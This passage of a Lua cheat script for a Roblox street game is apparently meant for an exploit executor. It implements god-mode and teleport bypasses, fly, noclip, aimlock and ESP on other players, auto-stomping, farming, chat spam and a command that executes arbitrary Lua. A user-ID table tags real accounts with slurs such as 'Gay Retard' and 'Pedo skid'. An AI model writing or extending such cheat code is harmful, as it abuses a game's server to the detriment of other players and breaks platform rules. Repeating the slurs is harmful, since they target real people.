					if (LP.Character.HumanoidRootPart.Position - Players[i].Character.HumanoidRootPart.Position).magnitude < 50  and Players[i].Character:FindFirstChild'KO' and Players[i].Character.Humanoid.Health > 0 and not LP.Character:FindFirstChild'KO' and LP.Character.Humanoid.Health > 0 then
						local CurrentTool = LP.Character:FindFirstChild'Punch'
						if not CurrentTool then 
							CurrentTool = LP.Backpack.Punch
							CurrentTool.Parent = LP.Character
						end
						LP.Character.HumanoidRootPart.CFrame = CFrame.new(Players[i].Character.HumanoidRootPart.Position)
						LP.Backpack.ServerTraits.Finish:FireServer(CurrentTool)
					end
				end
			end
		end
		if TpBypass and LP.Character:FindFirstChild'HumanoidRootPart' then 
			LP.Character.HumanoidRootPart:Destroy()
		end
		if GodMode and LP.Character:FindFirstChild'Right Leg' then 
			LP.Character['Right Leg']:Destroy()
		end 
		if NormalBfg then 
		local Child = LP.Backpack:GetChildren()
			for i = 1,#Child do 
				if Child[i]:FindFirstChild'Fire' then
					Child[i].Parent = LP.Character
				end
			end
		end
		if AntiAfk then 
			keypress(0x20)
			wait()
			keyrelease(0x20)
		end
	end)
end

local function GodFuckIhateRobloxIHaveNoMotivationForThisShitGame(Thing)
    if Thing.Name == "KO" and AutoDie then 
        LP.Character:BreakJoints()
    end
end

local function bc(Tool)
	if Tool.Name == "Uzi" then 
		loluzistatscool()
	end
end

local function lol()
	if not SpawnWS then 
		WalkSpeed = 16
	end
	if not SpawnSprint then
		ShiftSpeed = 25
	end
	if not SpawnCrouch then 
		ControlSpeed = 8 
	end
end 

local function Added()
	repeat wait(0.5) until LP.Character:FindFirstChildWhichIsA'Humanoid' and LP.Character.Animate
	LP.Character.Humanoid.StateChanged:Connect(HumanoidState)
	LP.Backpack.ChildAdded:Connect(MultiUzif)
	LP.Character.ChildAdded:Connect(GodFuckIhateRobloxIHaveNoMotivationForThisShitGame)
	LP.PlayerGui.ChildAdded:Connect(bc)
	Normalwalk = true
	LP.Character['Left Leg'].Touched:Connect(lolmultiuzithatisreloading)
	LP.Character.Humanoid.Died:Connect(lol)
	StarterGui:SetCore('ResetButtonCallback',BindableEvent)
    LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed = SpawnWS or NormalWS
    LP.Character:FindFirstChildWhichIsA'Humanoid'.JumpPower = SpawnJP or NormalJP
	LP.Character:FindFirstChildWhichIsA'Humanoid'.HipHeight = SpawnHH or NormalHH
	if PlayOnDeath then 
		local Tool = LP.Backpack:FindFirstChild'BoomBox'
		repeat wait() until Tool 
		Tool.Parent = LP.Character
		Tool:FindFirstChildOfClass'RemoteEvent':FireServer("play",PlayOnDeath)
		Tool.Parent = LP.Backpack
	end
	if WaitingToRespawn then 
        Teleport(WaitingToRespawnPos)
	end
end

Cmds.btools = function(Arguments)
	local DeleteTool = Instance.new('Tool',LP.Backpack)
	DeleteTool.Name = "Zetox Btools"
end 

Cmds.draggablegui = function(Arguments)
local Children = LP.PlayerGui.HUD:GetChildren()
	for i = 1,#Children do 
		Children[i].Active = not Children[i].Active 
		Children[i].Draggable = not Children[i].Draggable
	end
end

Cmds.nogh = function(Arguments)
  NoGh = not NoGh
  notif("Command: NoGh","has been set to "..tostring(NoGh),5,"rbxassetid://1281284684")
end

Cmds.tpbypass = function(Arguments)
	TpBypass = true
	LP.Character:BreakJoints()
end

Cmds.godmode = function(Arguments)
	GodMode = not GodMode
	LP.Character:BreakJoints()
end

Cmds.grip = function(Arguments) 
local Tool = LP.Character:FindFirstChildOfClass'Tool'
    if Tool then
        Tool.Parent = LP.Backpack
        Tool.Grip = CFrame.new(Arguments[1] or 0,Arguments[2] or 0,Arguments[3] or 0) + Vector3.new(Arguments[4] or 0,Arguments[5] or 0,Arguments[6] or 0)
        Tool.Parent = LP.Character
    else 
        notif("NO TOOLS","ONE TOOL IS NEEDED",5,nil)
    end
end

Cmds.spamclick = function(Arguments)
	if Arguments[1] then 
		for _ = 1,Arguments[1] or 50 do
			for i = 1,#BChild do 
				BChild[i].Click:FireServer()
			end 
			for i =1,#CChild do 
				CChild[i].Click:FireServer()
			end
			wait()
		end
	end
end

Cmds.muteallradios = function(Arguments)
	for _,Child in pairs(game:GetDescendants()) do 
		if Child:isA'Tool' and Child:FindFirstChild'Click' then
			for i = 1,10 do 
				Child.Click:FireServer()
			end
		end 
	end 
end

local Normalwalk = false  
Cmds.speed = function(Arguments)
	if Arguments[1] then
		WalkSpeed = Arguments[1]
		NormalWalk = true
		LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed = Arguments[1]
	end
end

Cmds.ws = function(Arguments)
	if Arguments[1] then
		Normalwalk = true
		RunCmd("speed "..Arguments[1])
	end
end

Cmds.sprintspeed = function(Arguments)
	if Arguments[1] then
		Normalwalk = false 
		ShiftSpeed = Arguments[1]
	end
end

Cmds.crouchspeed = function(Arguments)
	if Arguments[1] then
		Normalwalk = false 
		ControlSpeed = Arguments[1]
	end
end

Cmds.jumppower = function(Arguments)
	if Arguments[1] then 
		LP.Character:FindFirstChildWhichIsA'Humanoid'.JumpPower = Arguments[1]
	end
end

Cmds.jp = function(Arguments)
	if Arguments[1] then
		RunCmd("jumppower "..Arguments[1])
	end
end

Cmds.rejoin = function(Arguments)
	TeleportService:Teleport(game.PlaceId)
end

Cmds.rj = function(Arguments)
	
	RunCmd("rejoin")
end

Cmds.hipheight = function(Arguments)
    if Arguments[1] then 
        LP.Character.Humanoid.HipHeight = Arguments[1]
    end
end

Cmds.hh = function(Arguments)
    if Arguments[1] then 
        RunCmd("hipheight "..Arguments[1])
    end
end

Cmds.airwalk = function(Arguments)
	if Arguments[1] then 
		if string.lower(Arguments[1]) == "on" then
			AirWalkOn = true 
			AirWalk.Anchored = true 
			AirWalk.Size = Vector3.new(5,1,5)
			AirWalk.Transparency = 1 
			AirWalk.Parent = workspace
			AirWalk.Material = "Neon"
		elseif string.lower(Arguments[1]) == "off" then
			AirWalkOn = false
			AirWalk.Parent = nil
		end
	end
end

Cmds.sit = function(Arguments)
  LP.Character.Humanoid.Sit = true
end

Cmds.neversit = function(Arguments)
  NeverSitting = not NeverSitting
  notif("Command: NeverSit","has been set to "..tostring(NeverSitting),5,"rbxassetid://1281284684")
end

Cmds.autodie = function(Arguments)
    AutoDie = not AutoDie
    notif("Command: AutoDie","has been set to "..tostring(AutoDie),5,"rbxassetid://1281284684")
end 

Cmds.reset = function(Arguments)
	WaitingToRespawn = true 
	WaitingToRespawnPos = LP.Character.HumanoidRootPart.CFrame
	LP.Character:BreakJoints()
end

Cmds.re = function(Arguments)
	RunCmd("reset")
end

Cmds.noclip = function(Arguments)
	Noclipping = not Noclipping
	notif("Command: Noclip: on","Noclip has been set to "..tostring(Noclipping),5,"rbxassetid://1281284684")
end

Cmds.to = function(Arguments)
	if Arguments[1] then
        Teleport(PlrFinder(Arguments[1]).Character.HumanoidRootPart.CFrame)
        Noclipping,NeverSitting = false,false
	end
end

Cmds.droptool = function(Arguments)
    if LP.Character:FindFirstChildOfClass'Tool' then 
        LP.Character:FindFirstChildOfClass'Tool'.Parent = workspace.Terrain
    end
end

Cmds.goto = function(Arguments)
	if Arguments[1] then
		RunCmd("to "..Arguments[1])
	end
end

Cmds.autostomp = function(Arguments)
	AutoStomp = not AutoStomp
	notif("Command: AutoStomp","has been set to "..tostring(AutoStomp),5,"rbxassetid://1281284684")
end

Cmds.antikill = function(Arguments)
AntiKill.Size = Vector3.new(5,1,5)
AntiKill.Transparency = 1
AntiKill.Anchored = true 

for i = 1,#BChild do 
	if BChild[i]:IsA'Tool' then 
		AntiKillTools[#AntiKillTools + 1] = BChild[i]
	end
end

local function ToolAdded(h)
	if h:IsA'Tool' then
		for i = 1,#AntiKillTools do if h == AntiKillTools[i] then return end end 
			AntiKill.Parent = workspace
			AntiKill.CFrame = LP.Character.Head.CFrame + Vector3.new(0,-4,0)
			LP.Character.HumanoidRootPart.CFrame = AntiKill.CFrame
			LP.Character.Head.Anchored = true
			AntiKill.Parent = nil 
			wait(1)
			LP.Character.Head.Anchored = false
			AntiKillTools[#AntiKillTools + 1] = h
		end
	end 
	LP.Character.ChildAdded:Connect(ToolAdded)
end

Cmds.time = function(Arguments)
	if Arguments[1] then
		ClockTime = Arguments[1]
	end
end

Cmds.blink = function(Arguments)
	if Arguments[1] then 
		Blinking = true
		BlinkSpeed = Arguments[1] 
	else 
		Blinking = true 
		BlinkSpeed = 0.3
	end
end

Cmds.unblink = function(Arguments)
	Blinking = false
end

Cmds.tpto = function(Arguments)
	if Arguments[1] then 
		if Arguments[1]:lower() == "banland" then 
			game:GetService'TeleportService':Teleport(4669040)
		elseif Arguments[1]:lower() == "normalstreets" then 
			game:GetService'TeleportService':Teleport(455366377)
		elseif Arguments[1]:lower() == "uzi" then 
			GrabThing("Uzi")
		elseif Arguments[1]:lower() == "machete" then 
			GrabThing("Machete")
		elseif Arguments[1]:lower() == "spray" then 
			GrabThing("Spray")
		elseif Arguments[1]:lower() == "sawed" or Arguments[1]:lower() == "sawedoff" then 
			GrabThing("SawedOff")
		elseif Arguments[1]:lower() == "pipe" then 
			GrabThing("Pipe")
		end
	end
end

Cmds.fly = function(Arguments)
  local function fly(Speed)
    flying = true
    local BodyGyro,BodyPos = Instance.new('BodyGyro',LP.Character.Head),Instance.new('BodyPosition',LP.Character.Head)
    BodyPos.maxForce = Vector3.new(9e9,9e9,9e9)
    BodyPos.Position = LP.Character.Head.Position
    BodyGyro.maxTorque = Vector3.new(9e9,9e9,9e9)
    BodyGyro.CFrame = LP.Character.Head.CFrame
    pcall(function()
      repeat wait()
		if LP.Character:FindFirstChildWhichIsA'Humanoid' then 
			LP.Character.Humanoid.PlatformStand = true
		end
        local Pos = BodyGyro.CFrame - BodyGyro.CFrame.p + BodyPos.Position
        if not KeyTable['w'] and not KeyTable['a'] and not KeyTable['s'] and not KeyTable['d'] then 
          Speed = Speed
        elseif KeyTable['w'] then
          Pos = Pos + workspace.Camera.CoordinateFrame.lookVector * Speed
        elseif KeyTable['a'] then 
          Pos = Pos * CFrame.new(-Speed, 0, 0)
        elseif KeyTable['s'] then 
          Pos = Pos - workspace.Camera.CoordinateFrame.lookVector * Speed 
        elseif KeyTable['d'] then 
          Pos = Pos * CFrame.new(Speed, 0, 0)
        end 
        BodyPos.Position = Pos.p
        BodyGyro.CFrame = workspace.Camera.CoordinateFrame
        until not flying 
      if BodyGyro and BodyPos then 
        BodyGyro:Destroy()
        BodyPos:Destroy()
      end
        LP.Character.Humanoid.PlatformStand = false 
      end)
  end
  local function fuckyou(Key)
    if Key:lower() == "w" then 
        KeyTable['w'] = true 
      elseif Key:lower() == "a" then 
        KeyTable['a'] = true
      elseif Key:lower() == "s" then 
        KeyTable['s'] = true 
      elseif Key:lower() == "d" then 
        KeyTable['d'] = true
      end
  end
  local function stupidskid(Key)
    if Key:lower() == "w" then 
        KeyTable['w'] = false 
      elseif Key:lower() == "a" then 
        KeyTable['a'] = false 
      elseif Key:lower() == "s" then 
        KeyTable['s'] = false 
      elseif Key:lower() == "d" then 
        KeyTable['d'] = false
      end
  end
  Mouse.KeyDown:Connect(fuckyou)
  Mouse.KeyUp:Connect(stupidskid)
  fly(Arguments[1] or 10)
end

Cmds.unfly = function(Arguments)
	flying = false
end

Cmds.loop = function(Arguments)
	if Arguments[1] and Arguments[2] then 
		if string.lower(Arguments[1]) == "ws" or string.lower(Arguments[1]) == "speed" then 
			LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed = Arguments[2]
			SpawnWS = Arguments[2] or NormalWS
		elseif string.lower(Arguments[1]) == "jp" or string.lower(Arguments[1]) == "jumppower" then 
			LP.Character:FindFirstChildWhichIsA'Humanoid'.JumpPower = Arguments[2]
            SpawnJP = Arguments[2] or NormalJP
        elseif string.lower(Arguments[1]) == "hh" or string.lower(Arguments[1]) == "hipheight" then
            LP.Character:FindFirstChildWhichIsA'Humanoid'.HipHeight = Arguments[2] 
			SpawnHH = Arguments[2] or NormalHH
		elseif string.lower(Arguments[1]) == "sprint" then
			SpawnSprint = Arguments[2] or 25
			ShiftSpeed = Arguments[2] or 25 
		elseif string.lower(Arguments[1]) == "crouch" then
			SpawnCrouch = Arguments[2] or 8
			ControlSpeed = Arguments[2] or 25 
        end
	end
end

Cmds.info = function(Arguments)
  if Arguments[1] then
	  if not Arguments[2] then
		local v = PlrFinder(Arguments[1])
		notif(v.Name,"Is on "..v.OsPlatform.." and is "..v.AccountAge.." days old",5,nil)
      elseif Arguments[2] and Arguments[2]:lower() == "os" or Arguments[2]:lower() == "operatingsystem" then 
		notif(v.Name,"is on "..v.OsPlatform,5,nil)
      elseif Arguments[2] and Arguments[2]:lower() == "age" or Arguments[2]:lower() == "accountage" or Arguments[2]:lower() == "accage" then 
        notif(v.Name,"has the account age of "..v.AccountAge,5,nil)
      end
  else
      notif(LP.Name,"you are on "..LP.OsPlatform.."(duh) and your Account Age is "..LP.AccountAge,5,nil)
  end
end

local SpamText,Spamming,SpamDelay = nil,false,1

Cmds.spam = function(Arguments)
  if Arguments[1] then 
    SpamText = table.concat(Arguments," ")
    Spamming = true
  end
end 

Cmds.unspam = function(Arguments)
  Spamming = false 
end

Cmds.spamdelay = function(Arguments)
  if Arguments[1] then
    SpamDelay = Arguments[1]
  end
end

Cmds.unloop = function(Arguments)
	SpawnWS = NormalWS
    SpawnJP = NormalJP
    SpawnHH = NormalHH 
end

local AntiAim = false 
Cmds.antiaim = function(Arguments)
	if AntiAim then 
		local Tracks = LP.Character:FindFirstChildOfClass'Humanoid':GetPlayingAnimationTracks()
		for i = 1,#Tracks do 
			if string.find(tostring(Tracks[i].AnimationId),"215384594") then 
				Tracks[i]:Stop()
			end
		end
	else
		local Anim = Instance.new'Animation'
		Anim.AnimationId = "rbxassetid://215384594"
		LP.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(Anim):play(5,45,250)
	end
end

Cmds.aimlock = function(Arguments)
	if Arguments[1] then 
			local v = PlrFinder(Arguments[1])
			AimLock = true
			OnlyAimLock = true 
			AimlockTarget = v.Character
			b = v.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function(Char)
				AimlockTarget = nil 
			end)
			AimlockTarget.ChildAdded:Connect(function(P) 
				if P.Name == "KO" then 
					AimlockTarget = nil 
					OnlyAimLock = false
				end
			end)
		notif("Command: AimLock","has been set to "..tostring(AimLock).." target is "..v.Name,5,"rbxassetid://1281284684")
	else
		OnlyAimLock = false
		AimLock = not AimLock
		notif("Command: AimLock","has been set to "..tostring(AimLock),5,"rbxassetid://1281284684")
	end
end

Cmds.bringcar = function(Arguments)
local Car = workspace.Cars:GetDescendants() 
	for i = 1,#Car do 
		if Car[i]:IsA'VehicleSeat' and Car[i].Name == "Drive" and not Car[i].Occupant then 
			LP.Character.HumanoidRootPart.CFrame = Car[i].CFrame
		end
	end 
end

--[[Cmds.join = function(Arguments)
	if Arguments[1] and Arguments[2] then 
		local Username,UserId = pcall(function() -- legit just how synapse x stream sniper does it just edited to work with my admin credit: https://github.com/syngp/SynapseX/blob/master/Synapse%20Scripts/StreamSniper.lua
			if tonumber(Arguments[2]) then 
				return tonumber(Arguments[2])
			end 
			return Players:GetUserIdFromNameAsync(Arguments[2])
		end)
		if not Username then 
			notif("Command: Join","Not a player",5,"rbxassetid://1281284684")
		end 
		local Thumbnail,Index,Place = HttpService:JSONDecode(game:HttpGet('https://www.roblox.com/headshot-thumbnail/json?userId='..UserId..'&width=48&height=48')),0
		if Arguments[2]:lower() == "prison" then Place = "4669040" elseif Arguments[2]:lower() == "streets" then Place = "4669040" end
		while true do
			local GameInstances = HttpService:JSONDecode(game:HttpGet("https://www.roblox.com/games/getgameinstancesjson?placeId=" ..Place.. "&startindex=" ..Index))
				for GameIndex,GameValue in pairs(GameInstances.Collection) do 
					for PlayerIndex,PlayerValue in pairs(GameValue.CurrentPlayers) do 
						if PlayerValue.Id == UserId or PlayerValue.Thumbnail.Url == Thumbnail.Url then
							TeleportService:TeleportToPlaceInstance(tonumber(PlaceId),GameValue.Guid)
							LP.OnTeleport:Connect(function(State)
								if State == Enum.TeleportState.Failed then 
									TeleportService:TeleportToPlaceInstance(tonumber(PlaceId),GameValue.Guid)
									print'failed'
								end 
							end)
							return 
						end
					end
				end
				if Index > GameInstances.TotalCollectionSize then 
					notif("Command: Join","They might be in a VIP server or not on streets/prison.",5,"rbxassetid://1281284684")
				end
			end
		Index = Index + 10 
	end
end

Currently broken so not in use 
]]

Cmds.key = function(Arguments)
	if Arguments[1] and Arguments[2] then
		for x,v in pairs(Keys) do
		local Key = string.match(v, "[%a%d]+$")
		if Key == string.lower(Arguments[1]) then
				table.remove(Keys,x)
			end
		end
		local hotkeyKEY = string.sub(Arguments[1], 1, 3)
		table.remove(Arguments, 1)
		local hotkeyCMD = table.concat(Arguments, " ")
		table.insert(Keys, hotkeyCMD.."||"..hotkeyKEY)
		updateSettings()
	end
end 

local HDebounce = false 
Cmds.heal = function(Arguments)
	if HDebounce or not PartTable then return end 
	Heal()
	HDebounce = true 
	repeat wait() until workspace:FindFirstChild'Burger | $15' and workspace:FindFirstChild'Drink | $15' 
	HDebounce = false 
end 

local RDebounce = false 
Cmds.reload = function(Arguments)
if RDebounce or not PartTable then return end 
if LP.Character:FindFirstChildOfClass'Tool' and not LP.Character:FindFirstChildOfClass'Tool'.Clips or not LP.Character:FindFirstChildOfClass'Tool' then notif("Tool needed","Hold a gun",5,nil) return end 
	Ammo()
	RDebounce = true 
	repeat wait() until workspace:FindFirstChild'Buy Ammo | $25' 
	RDebounce = false 
end

Cmds.doublejump = function(Arguments)
  DoubleJumpEnabled = not DoubleJumpEnabled
  notif("Command: DoubleJump","has been set to "..tostring(DoubleJumpEnabled),5,"rbxassetid://1281284684")
end

Cmds.removekey = function(Arguments)
	if Arguments[1] then
		for x,v in pairs(Keys) do
			local Key = string.match(v, "[%a%d]+$")
			if Key == string.lower(Arguments[1]) then
				table.remove(Keys,x)
				updateSettings()
			end
		end
	end
end

Cmds.colour = function(Arguments)
	if Arguments[1] then 
		if Arguments[1]:lower() == "outline" then 
			Cframe.BackgroundColor3 = Color3.new(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1]:lower() == "text" then 
			CText.BackgroundColor3 = Color3.new(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1]:lower() == "background" then 
			CmdFrame.BackgroundColor3 = Color3.new(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1]:lower() == "cmds" then 
			local Child = CmdFrame:GetChildren() 
			for i = 1,#Child do 
				if Child[i]:IsA'TextLabel' then 
					Child[i].BackgroundColor3 = Color3.new(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
				end
			end
		end
	else
		notif("Command: Colour","Colour: [BackGround/Text/Outline/cmds] [rgb]",5,"rbxassetid://1281284684")
	end
end

Cmds.removeallkeys = function(Arguments)
	Keys = {}
	ClickTpKey = ""
	updateSettings()
end

Cmds.clicktp = function(Arguments)
	if Arguments[1] then
		ClickTpKey = string.sub(Arguments[1], 1, 1)
		updateSettings()
	end
end

Cmds.view = function(Arguments)
	if Arguments[1] then
		View(PlrFinder(Arguments[1]))
	end
end

Cmds.unview = function(Arguments)
	View(LP)
end

--[[Cmds.audioprotect = function(Arguments)
	if Arguments[2] then
		print(Arguments[2])
		local HttpGet = game:HttpGet("https://www.roblox.com/studio/plugins/info?assetId="..Arguments[2])
		local Find = string.find(HttpGet,"value=")
		local ID = HttpGet:sub(Find + 7,Find + 16)
		PlayOnDeath = ID
		LP.Character.BoomBox:FindFirstChildOfClass'RemoteEvent':FireServer("play",ID)
	end
end -- hidden gamer command soon:tm: 
]]

Cmds.style = function(Arguments)
if not _G.DoYouHaveBfgBypass then notif("Command: Style","This is only for people with BFG bypass. Use the grip command.",5,"rbxassetid://1281284684") return end 
  if Arguments[1] then 
    if Arguments[1]:lower() == "void" then
      if not Arguments[2] then 
        Style1(0.6) 
      else
        Style1(tonumber(Arguments[2]))
      end
      elseif Arguments[1]:lower() == "shield1" then
        Style2()
      elseif Arguments[1]:lower() == "wormhole" then 
        Style3()
      elseif Arguments[1]:lower() == "circle" then
        if not Arguments[2] then 
          Style4(100)
        else 
          Style4(tonumber(Arguments[2]))
        end
      elseif Arguments[1]:lower() == "sphere" then 
        Style5()
      elseif Arguments[1]:lower() == "storm" then
        Style6()
      elseif Arguments[1]:lower() == "shield2" then
        Style7()
      elseif Arguments[1]:lower() == "deathcircle" then
        Style8()
      end
    end
end

Cmds.bfg = function(Arguments)
  if not Arguments[1] then 
	if _G.DoYouHaveBfgBypass then 
		BfgOn = not BfgOn
	else
		MultiUzi = not MultiUzi
	end
  elseif Arguments[1] and Arguments[1]:lower() == "allbfg" then 
		if _G.DoYouHaveBfgBypass then 
			NormalBfg = not NormalBfg
		else 
			notif("Command: BFG","This mode is only for people with BFG bypass.",
			5,"rbxassetid://1281284684")
		end
  elseif Arguments[1] and Arguments[1]:lower() == "minigun" then 
      	MinigunMode = not MinigunMode
  elseif Arguments[1] and Arguments[1]:lower() == "multiuzi" then 
        MultiUzi = not MultiUzi
    end
end

Cmds.fblink = function(Arguments)
	if Arguments[1] then 
		BlinkKey = Arguments[1]:sub(1,1)
		updateSettings()
	end
end

local AutoFarm = false 
Cmds.farm = function(Arguments)
    if Arguments[1] then 
        if Arguments[1]:lower() == "cash" then 
          farm("Cash")
        elseif Arguments[1]:lower() == "shotty" then 
          farm("Shotty")
        elseif Arguments[1]:lower() == "uzi" then 
          farm("Uzi")
        elseif Arguments[1]:lower() == "katana" then 
          farm("Katana")
        elseif Arguments[1]:lower() == "sawed off" or Arguments[1]:lower() == "sawed" then 
          farm("Sawed Off")
        elseif Arguments[1]:lower() == "all" then 
		  farm("All")
		elseif Arguments[1]:lower() == "auto" then 
			if not AutoFarm then
				farm("Cash")
			end
			local WChild = workspace:GetDescendants() 
			for i = 1,#WChild do
				if WChild[i]:IsA'Seat' then 
					WChild[i]:Destroy()
				end
			end
			AutoFarm = not AutoFarm
      	end
    end
end

workspace.ChildAdded:Connect(function(Part)
	if Part.Name == "RandomSpawner" and AutoFarm then 
		farm("Cash")
	end 
end)

Cmds.fspeed = function(Arguments)
	if Arguments[1] then
		speedfly = Arguments[1]
	end
end

Cmds.esp = function(Arguments)
	if Arguments[1] then
			local espPlayer = PlrFinder(Arguments[1])
			for i,createESP in pairs(espPlayer.Character:GetDescendants()) do
				if createESP.Name == "Torso" or createESP.Name == "Left Leg" or createESP.Name == "Right Leg" or createESP.Name == "UpperTorso" or createESP.Name == "LowerTorso" or createESP.Name == "RightLowerLeg" or createESP.Name == "RightUpperLeg" or createESP.Name == "RightFoot"or createESP.Name == "UpperTorso" or createESP.Name == "LeftFoot" or createESP.Name == "LeftLowerLeg" or createESP.Name == "LeftUpperLeg" or createESP.Name == "Left Arm" or createESP.Name == "Right Arm" then
					if createESP.Name ~= "HumanoidRootPart" and createESP.Name ~= "Handle" then
						local current = true
						local espBOX = Instance.new("BoxHandleAdornment",CoreGui.RobloxGui)
						espBOX.Name = "[ESP]"..espPlayer.Name
						espBOX.Adornee = createESP
						espBOX.AlwaysOnTop = true
						espBOX.ZIndex = 0
						espBOX.Size = Vector3.new(createESP.Size.X,2,createESP.Size.Z)
						espBOX.Transparency = 0.3	
						local AboveHead = Instance.new("BillboardGui",CoreGui.RobloxGui)
						AboveHead.Adornee = espPlayer.Character:FindFirstChild("Head")
						AboveHead.Name = "[ESP]"..espPlayer.Name
						AboveHead.Size = UDim2.new(0, 100, 0, 100)
						AboveHead.StudsOffset = Vector3.new(0, 1, 0)
						AboveHead.AlwaysOnTop = true
						local Info = Instance.new("TextLabel",AboveHead)
						Info.BackgroundTransparency = 1
						Info.Position = UDim2.new(0, 0, 0, 0)
						Info.Size = UDim2.new(1, 0, 0, 40)
						Info.TextColor3 = Color3.fromRGB(200,200,200)
						Info.TextStrokeTransparency = 0.5
						Info.TextSize = 15
						if espPlayer.TeamColor == LP.TeamColor then
							espBOX.Color = BrickColor.new("Lime green")
							Info.TextStrokeColor3 = Color3.fromRGB(40, 127, 71)
						else
							espBOX.Color = espPlayer.TeamColor
							Info.TextStrokeColor3 = Color3.fromRGB(40, 127, 71)
						end
						RunService.Stepped:connect(function()
						pcall(function() 
							if current and LP.Character:FindFirstChildOfClass'Humanoid' and espPlayer.Character:FindFirstChild("Torso") then
								Info.Text = espPlayer.Name.." (".. math.floor((LP.Character.HumanoidRootPart.Position - espPlayer.Character.Torso.Position).magnitude)..")"
							end
						end)
					end)
					espPlayer.CharacterRemoving:Connect(function()
						current = false
						espBOX:Destroy()
						AboveHead:Destroy()
					end)
					Players.PlayerRemoving:Connect(function(plr)
						if plr == espPlayer then
							current = false
							espBOX:Destroy()
							AboveHead:Destroy()
						end
					end)
				end
			end
		end
	end
end

Cmds.luacode = function(Arguments)
	if Arguments[1] then 
		loadstring(table.concat(Arguments," "))()
	end 
end

Cmds.unesp = function(Arguments)
	if not Arguments[1] then
		for _,v in pairs(CoreGui:GetDescendants()) do
			if string.sub(v.Name, 1, 5) == "[ESP]" then
				v:Destroy()
			end
		end
	else
		for _,v in pairs(CoreGui:GetDescendants()) do
			if string.sub(v.Name, 1, 5) == "[ESP]" then
				for _,a in pairs(PlrFinder(Arguments[1])) do
					if string.sub(v.Name, 6) == a.Name then
						v:Destroy()
					end
				end
			end
		end
	end
end

Cmds.advertise = function(Arguments)
  wait(0.5)
  ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by NotCyrusAtAll(Alt: Periius) | Join the cord at UVgdNXP","All")
end

Cmds.antiafk = function(Arguments)
	AntiAfk = not AntiAfk
	notif("Command: AntiAfk","has been set to "..tostring(AntiAfk),5,"rbxassetid://1281284684")
end 

Cframe.BackgroundColor3 = Color3.new(0.666667,0,0)
Cframe.BackgroundTransparency = 0.20000000298023
Cframe.BorderSizePixel = 0
Cframe.Position = UDim2.new(0, 0, 1, 0)
Cframe.Size = UDim2.new(0, 270, 0, 35)
Cframe.Name = math.random(1,3000000)

CText.BackgroundColor3 = Color3.new(0,0.000738177,0.000738177)
CText.BorderSizePixel = 0
CText.Position = UDim2.new(0, 5, 0, 5)
CText.Size = UDim2.new(0, 260, 0, 25)
CText.Font = Enum.Font.SourceSansLight
CText.Text = ""
CText.TextColor3 = Color3.new(1, 1, 1)
CText.TextScaled = true
CText.TextSize = 14
CText.TextWrapped = true
CText.Name = math.random(1,3000000)

CmdFrame.BackgroundColor3 = Color3.new(0, 0.000738177, 0.000738177)
CmdFrame.BorderSizePixel = 0
CmdFrame.Position = UDim2.new(0, 0, -4, 0)
CmdFrame.Size = UDim2.new(1, 0, 4, 0)
CmdFrame.Visible = false

local function Create(Text)
	local CmdList = Instance.new("TextLabel",CmdFrame)
	CmdList.BackgroundColor3 = Color3.new(0.666667, 0, 0)
	CmdList.BackgroundTransparency = 0.20000000298023
	CmdList.BorderSizePixel = 0
	CmdList.Position = UDim2.new(-10, 0, 0, 0)
	CmdList.Size = UDim2.new(1, 0, 0, 20)
	CmdList.Font = Enum.Font.SourceSansLight
	CmdList.Text = Text
	CmdList.TextColor3 = Color3.new(0.952941, 0.952941, 0.952941)
	CmdList.TextScaled = true
	CmdList.TextWrapped = true
end

for _,cmds in pairs(CmdsList) do
	Create(cmds)
end

local function Changed()
pcall(function() 
	if CText.Text ~= "" then
		CmdFrame.Visible = true
		local PositionMatch = 0
		for _,cmd in pairs(CmdFrame:GetChildren()) do
				if string.find(string.lower(cmd.Text),string.lower(CText.Text)) then
					cmd.Position = UDim2.new(0, 0, 0, 2 + (PositionMatch * 20))
					PositionMatch = PositionMatch + 1
					if cmd.Position == UDim2.new(0, 0, 0, 142) then
						cmd.Position = UDim2.new(-10, 0, 0, 0)
						PositionMatch = PositionMatch - 1
					end
				else
					cmd.Position = UDim2.new(-10, 0, 0, 0)
				end
			end
		else
			CmdFrame.Visible = false
		end
	end)
end

local CoolkidTable = {
	['300227703']	= "!fishgang Envy";
	['590620847'] 	= "!fishgang Envy";
	['359564044'] 	= "!fishgang 7w4c";
	['659119329'] 	= "!fishgang Cy | Creator";
	['12978668']  	= "!fishgang Cy Alt | Creator";
	['74287496']  	= "!fishgang Scar";
	['543273273']	= "!fishgang Zell";
	['1333558384'] 	= "!fishgang Zell";
	['62009114'] 	= "!fishgang Alpha Supporter X_D6";
	['57370993'] 	= "!fishgang Gay Retard (Karma)";
	['713966451'] 	= "!fishgang Gay Retard (Karma) Alt";
	['20220183'] 	= "Wya";
	['105183043'] 	= "Pedo skid";
	['114164798'] 	= "!fishgang Slays";
	['868723261'] 	= "!fishgang Slays";
	['1066925283']	= "!fishgang Slays";
	['83600543'] 	= "!fishgang Slays";
	['779000075'] 	= "!fishgang Slays";
	['1202666022'] 	= "!fishgang Slays";
	['134755460'] 	= "!fishgang Slays";
	['29461396'] 	= "trippinfo";
	['197131085'] 	= "trippinfo";
	['412957'] 		= "trippinfo";
	['1443431439']  = "wk1r";
	['164282612']   = "wk1r";
	['548617338']   = "Sirhurt Gamer";
	['1275692258']  = "Big Dick";
	['1291336911'] 	= "I'm lazy";
	['d8bi']        = "Bird";
}

local function Started(Key,USELESSSINCEROBLOXISDOGSHIT)
if UserInput:GetFocusedTextBox() then return end -- fuck you roblox 
	if Key.KeyCode == Enum.KeyCode.LeftShift and not Normalwalk then
		KeyTable['Shift'] = true 
		LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = ShiftSpeed 
	end
	if Key.KeyCode == Enum.KeyCode.LeftControl and not Normalwalk then 
		LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = ControlSpeed 
	end
	if Key.KeyCode == Enum.KeyCode.Quote then
